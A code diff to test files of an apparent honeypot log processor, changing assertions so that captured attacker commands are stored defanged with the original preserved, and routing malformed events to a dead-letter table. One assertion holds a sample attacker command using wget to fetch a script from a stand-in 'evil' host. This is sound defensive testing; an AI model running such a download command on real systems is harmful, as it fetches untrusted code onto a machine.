@@ -6,7 +6,7 @@ import json
 from pathlib import Path
 from typing import Any, Dict
 
-from sqlalchemy import func, select
+from sqlalchemy import select, text
 from sqlalchemy.orm import sessionmaker
 
 from cowrieprocessor.db import RawEvent, SessionSummary, apply_migrations, create_engine_from_settings
@@ -66,8 +66,11 @@ def test_bulk_loader_inserts_raw_events(tmp_path):
         assert len(payloads) == 2
         sanitized = next(row.payload for row in payloads if row.payload.get("input_safe"))
         assert sanitized["input_safe"], "expected sanitized command"
-        assert sanitized.get("input") is None
-        assert sanitized.get("input_hash")
+        # With intelligent defanging, the input field contains the defanged version
+        assert sanitized.get("input") is not None
+        assert "[defang:" in sanitized.get("input", "")
+        # Original command should be preserved
+        assert sanitized.get("input_original") == "wget http://evil /tmp/run.sh"
 
         summaries = list(conn.execute(select(SessionSummary)).all())
         assert len(summaries) == 1
@@ -309,5 +312,6 @@ def test_bulk_loader_multiline_json_malformed_limit(tmp_path):
     assert metrics.events_quarantined == 2  # All are quarantined due to validation errors
 
     with engine.connect() as conn:
-        count = conn.execute(select(func.count()).select_from(RawEvent)).scalar_one()
-        assert count == 2
+        # Malformed events should be in dead_letter_events table
+        dl_count = conn.execute(text('SELECT COUNT(*) FROM dead_letter_events')).scalar_one()
+        assert dl_count == 2
